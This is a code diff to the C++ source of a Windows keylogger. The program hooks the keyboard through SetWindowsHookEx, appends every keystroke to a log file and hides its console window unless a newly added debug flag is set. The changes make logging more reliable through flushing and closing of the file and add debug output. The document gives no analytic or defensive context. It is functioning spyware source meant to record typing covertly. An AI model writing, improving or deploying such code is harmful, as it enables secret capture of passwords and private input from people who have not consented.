@@ -18,6 +18,10 @@
 
 // ---------------------------------------------------------------------------------------------
 
+// Whether or not to show the console window for debugging purposes
+#define isDebugging true
+
+// The path to the log file
 #define logFilePath "log.txt"
 
 // Low level keyboard hook
@@ -29,7 +33,7 @@ bool isHoldingShift;
 // The time when the user last pressed a key
 clock_t lastKeyPressTime;
 
-// The log file that we're writing key presses to
+// Handle to the log file
 std::ofstream logFile;
 
 
@@ -199,6 +203,11 @@ LRESULT CALLBACK hookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 
 		// Now we write this key to the log file
 		logFile << keyStr;
+		logFile.flush();
+
+		// And to the console if we're debugging
+		if (isDebugging)
+			std::cout << keyStr;
 
 		lastKeyPressTime = clock();
 	}
@@ -211,11 +220,12 @@ LRESULT CALLBACK hookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 // On program run
 int main() {
 	
-	// First we remove the console window
+	// First we remove the console window (If we are not in debugging mode)
 	HWND window;
 	AllocConsole();
 	window = FindWindowA("ConsoleWindowClass", NULL);
-	ShowWindow(window, 0);
+	if(!isDebugging)
+		ShowWindow(window, 0);
 	
 	// Now we register a low level keyboard hook with windows
 	keyboardHook = SetWindowsHookEx(
@@ -228,10 +238,18 @@ int main() {
 	// If we successfully hooked to the keyboard
 	if (keyboardHook)
 	{
-		// Initiate our handle to the log file
+
+		// Write any data that is currently waiting to be put into the file
+
+		// Open the log file
 		logFile.open(logFilePath, std::ios::app);
+
 		if (logFile.fail())
 			std::cout << "Failed to open file";
+		else
+			std::cout << "Successfully opened file";
+
+		logFile << std::endl << std::endl;
 
 		// Stay in the program until we're told to stop
 		MSG msg;
@@ -243,6 +261,9 @@ int main() {
 
 	// Release keyboard hook
 	UnhookWindowsHookEx(keyboardHook);
+
+	// Close the log file
+	logFile.close();
 
 	// Quit program
 	return 0;
